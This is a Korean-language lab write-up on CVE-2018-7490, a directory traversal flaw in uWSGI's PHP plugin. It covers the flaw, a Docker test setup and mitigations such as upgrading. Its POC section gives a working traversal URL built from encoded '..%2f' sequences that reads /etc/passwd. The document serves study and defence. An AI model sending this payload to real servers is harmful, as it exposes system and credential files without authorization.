
# uwsgi PHP 디렉토리 순회 취약점 (CVE-2018-7490)


## 개요

uWSGI는 WSGI/uwsgi/http와 같은 프로토콜을 구현하는 웹 애플리케이션 서버이며, 다양한 언어를 플러그인을 통해 지원합니다.

2.0.17 이전 버전의 uWSGI PHP 플러그인에서는 DOCUMENT_ROOT 감지를 제대로 처리하지 않아, %2f(URL 인코딩된 /)를 이용한 경로 조작을 통해 DOCUMENT_ROOT 외부의 파일을 읽거나 실행할 수 있는 취약점이 존재합니다.

## 환경 세팅

터미널에서 아래 명령어 입력

```
docker compose up -d
```
![]1.png

`http://localhost:8080` 에 접속하면 성공적으로 실행중인 uwsgi-php 서버 정보를 확인할 수 있습니다.

![]2.png

## POC

취약한 uWSGI PHP 서버에 다음 URL을 직접 요청:

 `http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd`

![]result.png

요청 결과, 브라우저에는 리눅스 시스템의 /etc/passwd 파일 내용이 그대로 출력됩니다.:


공격자는 /etc/passwd 외에도 서버 내 .env, 설정 파일, 소스코드 등 민감한 파일에 접근할 수 있습니다.

경우에 따라 원격 코드 실행(RCE) 또는 시스템 권한 탈취로도 이어질 수 있습니다.

## 대응방안

- uWSGI를 2.0.17 이상 버전으로 업데이트
- DOCUMENT_ROOT 하드코딩 또는 접근 경로에 대한 서버 측 필터링 적용